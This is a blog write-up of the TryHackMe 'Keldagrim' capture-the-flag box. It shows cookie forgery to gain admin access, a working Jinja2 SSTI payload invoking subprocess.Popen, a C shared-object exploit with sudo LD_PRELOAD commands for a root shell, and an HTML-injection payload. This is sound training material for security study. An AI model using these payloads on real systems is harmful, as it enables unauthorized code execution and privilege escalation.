---
layout: post
title:  Keldagrim Writeup
description: A realistic box. Many things were learned during this challenge, and I highly recommend reading this writeup.
date:   2021-02-05 
image:  '/images/0xd4y-logo-gray.png'
tags:   [Python, SSTI]
---

**This report can be read both on this site, and as its <a href = "https://0xd4y.github.io/reports/Keldagrim%20Writeup.pdf">original report form</a>. It is highly recommended that you read the original report form instead because it is better formatted.**

This box was rated as a medium difficulty by TryHackMe. This was a great box in the sense that the attacker did not have to get lucky by brute forcing a directory or password. Instead, the vulnerability came from connecting dots and researching. That being said, let’s get right into the box!

Enumerating the ports, we find that only ports 22 and 80 are open:

![](/reports/Keldagrim/image2.png)

Looking at the results we don’t find anything out of the ordinary, except for the httponly flag not being set. Let’s just check out the website and see what we find.

![](/reports/Keldagrim/image12.png)

xt file. We are met with a very simple page with a couple of directories. On the “Our Team” tab we find two possible users: Jed and Jad. This may or may not be useful later on, so I made sure to add this to my notes.txt file. Looking around we click on the “Buy Gold” tab and we see an interesting Admin option:

![](/reports/Keldagrim/image1.png)

Unfortunately the admin option is grayed out. I couldn’t find anything more useful in this so let’s use our trusty tool: Burpsuite! I captured a request to the /team directory and saw a couple of very strange things:

![](/reports/Keldagrim/image10.png)

First of all, there is a session cookie which is encoded in base64. Decoding this, we see that Z3Vlc3Q= is the base64 encode of guest. When base64 encoding the string ‘admin’ (YWRtaW4=) and pasting that into the session cookie, we see that the content length changes! Let’s use the developer tools, paste this base64 string in the session value, and reload the page.

![](/reports/Keldagrim/image5.png)

And we are now the admin! Unfortunately, there is not much that has changed except for the strange ‘sales’ cookie which is also base64 encoded. Decoding this, we see that it corresponds to the $2,165 we see on the screen. At this point, I was stuck for a long time, but at the back of my mind was this strange server in one of my requests to the page with all the packages to be bought:

![](/reports/Keldagrim/image13.png)

Server: Werkzeug/1.0.1 Python/3.6.9

This is what comes to mind. Seeing Werkzeug and python brings to mind that maybe Flask has something to do with this. After a lot of research, it seemed that this box might be vulnerable to SSTI (Server Side Template Injection). I came across a great article on this topic, which explained very well on how this vulnerability is exploited: [https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee](https://www.google.com/url?q=https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee&sa=D&source=editors&ust=1653954534767158&usg=AOvVaw3cO1ZM3W9Fe-ZTh2QettjH)

TL;DR you can get code execution through abusing flask. Proof of concept:

![](/reports/Keldagrim/image9.png)

![](/reports/Keldagrim/image4.png)

As we can see, the server evaluated 7\*7 which is 49. You must find the subprocess Popen under the <object> class with which you will get code execution. After viewing all the sub processes within the object class, I grepped the Popen subprocess to find at which index it is located. After discovering that it was at the 402nd location, the final payload looks like the following:

{{''.\_\_class\_\_.\_\_mro\_\_\[1\].\_\_subclasses\_\_()\[401\]('ls',shell=True,stdout=-1).communicate()}}

Now that we have code execution, let’s get a reverse shell!!

![](/reports/Keldagrim/image3.png)

There is user.txt. One of the first things I run when getting a reverse shell is sudo -l:

![](/reports/Keldagrim/image8.png)

Unfortunately, getting root won’t be as easy as just looking up /bin/ps on gtfobins. Fortunately, however getting root is easy nonetheless! The env\_keep+=LD\_PRELOAD is particularly strange. Looking this up, I came across an article that explained how to exploit this ([https://www.hackingarticles.in/linux-privilege-escalation-using-ld\_preload/](https://www.google.com/url?q=https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/&sa=D&source=editors&ust=1653954534768244&usg=AOvVaw0snkjC96zCdV2nbDP5tsbG))

Essentially, we want to create a shared object that will be run as root as part of the LD\_PRELOAD environment. As a result, the actual function for /bin/ps will be overridden by our own binary. Using this fact, we can create a shell as root! We must compile the code below as a shared object and add it to the LD\_PRELOAD environment.

1

2

3

4

5

6

7

8

9

#include <stdio.h>

#include <sys/types.h>

#include <stdlib.h>

void \_init() {

unsetenv("LD\_PRELOAD");

setgid(0);

setuid(0);

system("/bin/sh");

}

I saved the code below as exploit.c and compiled it with the following commands:

cd /tmp

gcc -fPIC -shared -o shell.so exploit.c -nostartfiles

sudo LD\_PRELOAD=/tmp/shell.so ps

![](/reports/Keldagrim/image6.png)

BONUS:

I ran nikto on this website, and it found an interesting vulnerability:

![](/reports/Keldagrim/image7.png)

According to nikto, the site is vulnerability to HTML injection so let’s try it out using the payload they suggest:

/ts2s1NMDd1VJtKSBRcn82Yzs6CMY1u42RDsdfO6lT8XQ4d2wnexQKAEmtizMPNHTnyEq2tGZFhuZFztIsW0KFFesXGzcEkCmWUYaq4CFDSQLzsu2gpT6eeKTFGHIDulc5a6layCW57JZyywP1ULTbIaz1LScDK6V74lsCTy8jH6z49h4spfFApiSynzRB18unriHDFcu1O9DivFGpMyUrxCsBPOLZQ0<font%20size=50>

![](/reports/Keldagrim/image11.png)

As can be seen, the font size has increased to a ridiculous size. This confirms the HTMLvulnerability. This vulnerability is not critical in the context of this box, as no other users will be using the exact same instance. However, in the case that this website were to be visited by many other users, the attacker can possibly steal their credentials by using a phishing attack. They can create a page for the victim to enter their username and password, and this information will be sent back to the attacker.  

This was a great box, and I thank the creator @optional for creating such a fun challenge! Thanks for reading this writeup, I hope you learned as much from this box as I did. I wish you a wonderful day (or night)!
